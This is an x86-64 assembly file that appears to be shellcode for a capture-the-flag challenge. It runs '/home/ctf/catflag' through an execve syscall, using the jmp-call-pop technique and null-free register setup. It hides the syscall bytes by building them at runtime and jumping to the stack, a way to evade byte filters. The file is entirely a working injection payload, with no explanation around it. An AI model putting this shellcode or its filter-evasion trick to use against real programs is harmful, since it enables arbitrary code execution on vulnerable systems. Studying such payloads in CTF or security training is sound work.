section .text
global _start
_start:
jmp short binsh
shellcode:
    pop rdi
    xor eax, eax
    add eax, 0x3b
    xor esi, esi
    xor edx, edx
    mov rcx, 0x909090909090050e
    add rcx, 0x0000000000000001
    push rcx
    jmp rsp
binsh:
    call shellcode
    db "/home/ctf/catflag"